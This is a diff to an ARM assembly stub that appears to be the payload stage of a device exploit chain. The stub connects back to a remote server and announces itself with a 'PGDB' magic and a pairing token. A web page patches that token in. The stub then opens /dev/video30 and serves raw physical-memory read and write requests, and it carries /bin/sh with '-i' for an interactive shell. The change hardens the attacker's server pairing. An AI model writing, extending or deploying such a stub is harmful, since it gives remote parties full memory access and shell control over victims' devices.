@@ -11,6 +11,12 @@
 @ are identical; change both together.
 @
 @ Protocol (all u32 little-endian, 16-byte header: op, a, b, c)
+@   hello        : stub -> server "PGDB" + pairing token (8 B, sent right
+@                  after connect, before the device open); then prctl_ret +
+@                  open_ret (8 B, sent after open).  The server token-checks
+@                  the first 8 bytes and forwards a 12-byte hello ("PGDB" +
+@                  prctl_ret + open_ret) to the RPC client - the client wire
+@                  format is unchanged.
 @   op 0 READ     : a=phys page (4K aligned), b=offset, c=len (<=4096)
 @                    -> c raw bytes
 @   op 1 WRITE32  : a=phys page, b=offset, c=value -> 4-byte status
@@ -65,6 +71,26 @@ _start:
     cmp     r0, #0
     blt     fail
 
+    @ announce "PGDB" + pairing token (hdr[0..8]) immediately, BEFORE the
+    @ device open.  The server classifies the connection and checks the token
+    @ against the value the page announced (POST /pair) while the open retries
+    @ below still run, so a slow open no longer looks like a silent raw peer
+    @ (v40; the old stub said nothing until open_ok and a >1.5 s open was
+    @ misrouted to the shell-slot refusal).
+    movw    r1, #OFF_hdr
+    add     r1, r12, r1
+    movw    r3, #0x4750
+    movt    r3, #0x4244           @ 0x42444750 = "PGDB" little-endian
+    str     r3, [r1]
+    movw    r3, #OFF_tok
+    add     r3, r12, r3
+    ldr     r3, [r3]
+    str     r3, [r1, #4]
+    mov     r0, r6
+    mov     r2, #8
+    mov     r7, #4                @ send
+    svc     #0
+
     @ open("/dev/video30", O_RDWR); retry while another opener holds it
     mov     r9, #120          @ ~120 s of 1 s sleeps
 open_retry:
@@ -86,22 +112,18 @@ open_retry:
     bne     open_retry
 open_ok:
 
-    @ send the routing magic first, then prctl_ret + open_ret (8 bytes)
+    @ hello status (hdr[8..16]): prctl_ret + open_ret, sent after the open.
+    @ The pairing word already went out right after connect; the server
+    @ composes the client-facing 12-byte hello ("PGDB" + these 8 bytes) so
+    @ the RPC clients see the same 12-byte header as always.
     movw    r1, #OFF_hdr
     add     r1, r12, r1
-    movw    r3, #0x4750
-    movt    r3, #0x4244           @ 0x42444750 = "PGDB" little-endian
-    str     r3, [r1]
-    str     r5, [r1, #4]
-    str     r8, [r1, #8]
+    str     r5, [r1, #8]
+    str     r8, [r1, #12]
     mov     r0, r6
-    mov     r2, #4
-    mov     r7, #4
-    svc     #0
-    mov     r0, r6
-    add     r1, r1, #4
+    add     r1, r1, #8
     mov     r2, #8
-    mov     r7, #4
+    mov     r7, #4                @ send
     svc     #0
 
     cmp     r8, #0
@@ -565,6 +587,13 @@ sa:         .word 0x50000002      @ AF_INET, port 80 (big endian)
             .word 0
 path:       .ascii "/dev/video30\0"
 hello:      .ascii "PGDB"
+tok:        .word 0x544b4f31      @ "TOK1" pairing-token placeholder (bytes
+                                  @ 31 4f 4b 54): the page finds this pattern,
+                                  @ rewrites it with a per-load random word and
+                                  @ announces the same value to the server via
+                                  @ POST /pair.  The server refuses a stub whose
+                                  @ token was not announced (one match only -
+                                  @ the page aborts on drift).
 shpath:     .ascii "/bin/sh\0"
 arg_i:      .ascii "-i\0"
     .align 2
